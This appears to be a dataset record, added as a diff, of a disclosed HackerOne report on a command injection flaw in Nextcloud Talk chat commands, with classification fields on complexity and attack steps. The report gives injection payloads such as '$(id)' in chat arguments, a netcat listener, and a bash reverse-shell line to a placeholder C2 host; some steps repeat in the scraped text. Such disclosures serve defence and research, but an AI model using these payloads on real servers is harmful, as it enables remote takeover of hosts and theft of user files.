@@ -1,0 +1,57 @@
+{
+  "reported_to": "Nextcloud",
+  "reported_by": "covert-spectre ",
+  "title": "Code injection possible with malformed Nextcloud Talk chat commands",
+  "content": "\nSummary\nThe Nextcloud Talk app allows system administrators to setup chat commands that can be executed in Talk using the \"/command\" syntax. Users can provide additional arguments to the commands, such as \"/calc 1+1\" or \"/wiki Hello\", which are passed to the underlying script using @exec. If arguments are accepted, it is possible to trigger arbitrary code by wrapping the code in bash subcommand syntax /wiki test $(mycommand). This allows for arbitrary code execution, which an actor can use to spawn a reverse shell back from the remote machine.\nLinks\nhttps://nextcloud-talk.readthedocs.io/en/latest/commands/#chat-commands\nhttps://github.com/nextcloud/spreed/issues/1566\nhttps://github.com/nextcloud/spreed/blob/384f39ded1dceab58491555744bd5326f8ff1e3f/lib/Chat/Command/ShellExecutor.php#L103\nSeverity\nThis bug has been filed with a severity of Critical inline with the bounty impact/definition chart and the Nextcloud Threat Model as the bug allows both remote code execution via a non-admin user as well as access of complete user data of any other user.\nAffected Versions\nAll versions that support Talk Commands appear to be affected as the bug is in the @execute command.\nThe following version were tested:\nmaster-2020-04-15 via snap install nextcloud --edge, occ.status versionstring: 19.0.0 beta 2\n17.0.5snap1 via snap install nextcloud, occ.status versionstring: 17.0.5\nRepro Steps\nInstall and Setup Nextcloud\ncreate Ubuntu 18.04 VM\ninstall Nextcloud Server (Nextcloud Hub snap used for this test snap install nextcloud --edge)\nrun install command: nextcloud.manual-install \"admin\" \"password\"\ngenerate self signed certificate nextcloud.enable-https self-signed\nset trusted domains nextcloud.occ config:system:set trusted_domains 1 --value=<domain/ip>\ncreate user alice\ninstall and enable spreed/talk app\nenable sample talk commands nextcloud.occ talk:command:add-samples\nadd calculator command as described in the documentation here\ncreate Ubuntu 18.04 VM\ninstall Nextcloud Server (Nextcloud Hub snap used for this test snap install nextcloud --edge)\nrun install command: nextcloud.manual-install \"admin\" \"password\"\ngenerate self signed certificate nextcloud.enable-https self-signed\nset trusted domains nextcloud.occ config:system:set trusted_domains 1 --value=<domain/ip>\ncreate user alice\ninstall and enable spreed/talk app\nenable sample talk commands nextcloud.occ talk:command:add-samples\nadd calculator command as described in the documentation here\nSetup C2 VM\nkali used for this test, can be any host with netcat nc\nrun nc listener nc -l -p 8888\nkali used for this test, can be any host with netcat nc\nrun nc listener nc -l -p 8888\nbash -i >& /dev/tcp/<c2-ip-here>/8888 0>&1 &\nLog In As Alice and Upload File\nupload above shell.sh to root directory of alice's Nexcloud files\nupload above shell.sh to root directory of alice's Nexcloud files\nWith Alice, start a Talk Conversation\n/wiki test $(id)\n\n/wiki test $(chmod +x /var/snap/nextcloud/common/nextcloud/data/alice/files/shell.sh)\n\nLocate uploaded shell script\nFor nextcloud snap, the data directory is defined here\nFile locations are fixed, therefore, once the root directory is known, it is easy to derive the location of the script\nCan use /calc test $(ls ../) to explore directory structure\nFor nextcloud snap, the data directory is defined here\nFile locations are fixed, therefore, once the root directory is known, it is easy to derive the location of the script\nCan use /calc test $(ls ../) to explore directory structure\nEnable execution of the script\n/wiki test $(chmod +x /var/snap/nextcloud/common/nextcloud/data/alice/files/shell.sh)\n\nObserver C2 Listener for Connection\nid \n\nAttachments\nSee attached screenshots\nImpact\nComplete access to all user files\nShell access to occ\nShell access to host machine - root access if Nextcloud is running as root\n\n",
+  "severity": [
+    8.0,
+    null
+  ],
+  "bounty": null,
+  "weaknesses": [
+    "Code Injection"
+  ],
+  "screenshots": {},
+  "disclosed_date": 1591124040,
+  "report_url": "https://hackerone.com/reports/851807",
+  "is_multi_component": false,
+  "complexity": "MEDIUM",
+  "novelty": "LOW",
+  "vuln_category": "WEB_APP",
+  "steps": [
+    [
+      1,
+      "Install and setup Nextcloud with Talk app and sample commands"
+    ],
+    [
+      2,
+      "Upload a malicious script to a user's Nextcloud files"
+    ],
+    [
+      3,
+      "Use chat commands with bash subcommand syntax to execute arbitrary commands (e.g., /wiki test $(id))"
+    ],
+    [
+      4,
+      "Use the command execution to locate and modify the uploaded script"
+    ],
+    [
+      5,
+      "Execute the script to establish a reverse shell"
+    ]
+  ],
+  "vuln_description": "The vulnerability allows for arbitrary code execution in Nextcloud Talk by exploiting malformed chat commands. Attackers can inject bash subcommands into command arguments, leading to remote code execution and potential full system compromise.",
+  "reason": "While the vulnerability involves multiple steps (setting up Nextcloud, uploading files, and executing commands), the core exploit is straightforward once the command injection vector is identified. The bash subcommand injection is a well-known technique, and the attack path is linear without complex state manipulation.",
+  "new_complexity": "MEDIUM",
+  "requires_code": true,
+  "requires_CVE": false,
+  "is_ctf": false,
+  "other_report": null,
+  "injection_metadata": {
+    "is_simple_payload": false
+  },
+  "authnz_metadata": {
+    "reason": "The vulnerability involves arbitrary code execution via malformed chat commands in Nextcloud Talk, which is not directly related to authentication or authorization bypass. The methodology described focuses on testing authorization boundaries by swapping user sessions and resource IDs, but this vulnerability exploits a command injection flaw in the chat command functionality, which is a different class of vulnerability.",
+    "is_detectable": false
+  }
+}
